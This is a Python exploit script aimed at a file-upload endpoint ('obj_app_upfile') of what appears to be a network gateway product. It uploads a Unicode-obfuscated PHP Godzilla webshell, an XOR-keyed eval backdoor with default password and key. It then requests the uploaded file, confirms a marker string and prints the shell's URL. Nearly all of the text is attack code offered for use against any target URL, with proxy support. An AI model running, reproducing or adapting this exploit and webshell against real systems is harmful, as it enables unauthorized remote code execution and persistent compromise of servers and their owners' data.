import os
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

# 若要修改上传文件名 需改59行出filename="vulntest.php" 和63行处 path2 = "/attachements/vulntest.php" 中的vulntest为文件名

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.url:
            self.verfyurl()

    def banner(self):
        logo = r"""
             _ _____           _____ _____ _      _____  ____ _____        _____      _  ______             
    (_)  ___|         /  ___/  ___| |    |____ |/ ___|  _  |      /  ___|    | | | ___ \            
     _\ `--.  ___  ___\ `--.\ `--.| |        / / /___| |/' |______\ `--.  ___| |_| |_/ /_ _ ___ ___ 
    | |`--. \/ _ \/ __|`--. \`--. \ |        \ \ ___ \  /| |______|`--. \/ _ \ __|  __/ _` / __/ __|
    | /\__/ /  __/ (__/\__/ /\__/ / |____.___/ / \_/ \ |_/ /      /\__/ /  __/ |_| | | (_| \__ \__ \
    |_\____/ \___|\___\____/\____/\_____/\____/\_____/\___/       \____/ \___|\__\_|  \__,_|___/___/                                                                                    
        """
        print("\033[91m" + logo + "\033[0m")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. http://127.0.0.1)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=60, help="Request timeout (default 3)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()

    def proxy_server(self):
        proxy = self.args.proxy
        return proxy

    def respose(self, url):
        proxy = self.args.proxy  # 代理
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/?g=obj_app_upfile"  # 上传路径
        url = urljoin(url, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
        data = '--502f67681799b07e4de6b503655f5cae\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="upfile"; filename="vulntest.php"\r\nContent-Type: text/plain\r\n\r\n<?php \u0065\u0063\u0068\u006f\u0020\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0064\u0065\u0063\u006f\u0064\u0065\u0028\u0022\u005a\u0054\u0045\u0032\u004e\u0054\u0051\u0079\u004d\u0054\u0045\u0078\u004d\u0047\u004a\u0068\u004d\u0044\u004d\u0077\u004f\u0054\u006c\u0068\u004d\u007a\u0041\u007a\u004f\u0054\u004d\u007a\u004e\u007a\u004e\u006a\u004e\u0057\u0049\u0030\u004d\u0077\u003d\u003d\u0022\u0029\u003b\u000a\u0040\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u005f\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u003b\u000a\u0040\u0073\u0065\u0074\u005f\u0074\u0069\u006d\u0065\u005f\u006c\u0069\u006d\u0069\u0074\u0028\u0030\u0029\u003b\u000a\u0040\u0065\u0072\u0072\u006f\u0072\u005f\u0072\u0065\u0070\u006f\u0072\u0074\u0069\u006e\u0067\u0028\u0030\u0029\u003b\u000a\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0044\u002c\u0024\u004b\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0066\u006f\u0072\u0028\u0024\u0069\u003d\u0030\u003b\u0024\u0069\u003c\u0073\u0074\u0072\u006c\u0065\u006e\u0028\u0024\u0044\u0029\u003b\u0024\u0069\u002b\u002b\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0063\u0020\u003d\u0020\u0024\u004b\u005b\u0024\u0069\u002b\u0031\u0026\u0031\u0035\u005d\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0044\u005b\u0024\u0069\u005d\u0020\u003d\u0020\u0024\u0044\u005b\u0024\u0069\u005d\u005e\u0024\u0063\u003b\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0024\u0044\u003b\u000a\u007d\u000a\u0024\u0070\u0061\u0073\u0073\u003d\u0027\u0070\u0061\u0073\u0073\u0027\u003b\u000a\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u003d\u0027\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u0027\u003b\u000a\u0024\u006b\u0065\u0079\u003d\u0027\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061\u0027\u003b\u000a\u0069\u0066\u0020\u0028\u0069\u0073\u0073\u0065\u0074\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0024\u0070\u0061\u0073\u0073\u005d\u0029\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0024\u0064\u0061\u0074\u0061\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0064\u0065\u0063\u006f\u0064\u0065\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0024\u0070\u0061\u0073\u0073\u005d\u0029\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0069\u0073\u0073\u0065\u0074\u0028\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u0029\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0070\u006f\u0073\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u002c\u0022\u0067\u0065\u0074\u0042\u0061\u0073\u0069\u0063\u0073\u0049\u006e\u0066\u006f\u0022\u0029\u003d\u003d\u003d\u0066\u0061\u006c\u0073\u0065\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u000a\u0009\u0009\u0065\u0076\u0061\u006c\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u006d\u0064\u0035\u0028\u0024\u0070\u0061\u0073\u0073\u002e\u0024\u006b\u0065\u0079\u0029\u002c\u0030\u002c\u0031\u0036\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0040\u0072\u0075\u006e\u0028\u0024\u0064\u0061\u0074\u0061\u0029\u002c\u0024\u006b\u0065\u0079\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u006d\u0064\u0035\u0028\u0024\u0070\u0061\u0073\u0073\u002e\u0024\u006b\u0065\u0079\u0029\u002c\u0031\u0036\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u007d\u0065\u006c\u0073\u0065\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0070\u006f\u0073\u0028\u0024\u0064\u0061\u0074\u0061\u002c\u0022\u0067\u0065\u0074\u0042\u0061\u0073\u0069\u0063\u0073\u0049\u006e\u0066\u006f\u0022\u0029\u0021\u003d\u003d\u0066\u0061\u006c\u0073\u0065\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0064\u0061\u0074\u0061\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u007d?>\r\n\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n--502f67681799b07e4de6b503655f5cae--'
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=self.args.timeout,
                                     verify=False)
            path2 = "/attachements/vulntest.php"
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            }
            resurl = urljoin(url, path2)
            response2 = requests.get(resurl, headers=header, proxies=proxies, timeout=self.args.timeout, verify=False)
            if "e165421110ba03099a30393373c5b43" in response2.text and response2.status_code == 200:
                resshell = resurl
            else:
                resshell = "null"
            return resshell
        except:
            return "conn"

    def verfyurl(self):
        url = self.args.url
        repshell = self.respose(url)
        if "attachements" in repshell:
            print("[+] 漏洞存在！！！[✅] Godzilla(默认pass&key)shell地址为: {}".format(repshell))
        elif "null" in repshell:
            print("未检测到漏洞")
        else:
            print("URL连接失败")


if __name__ == "__main__":
    POC()
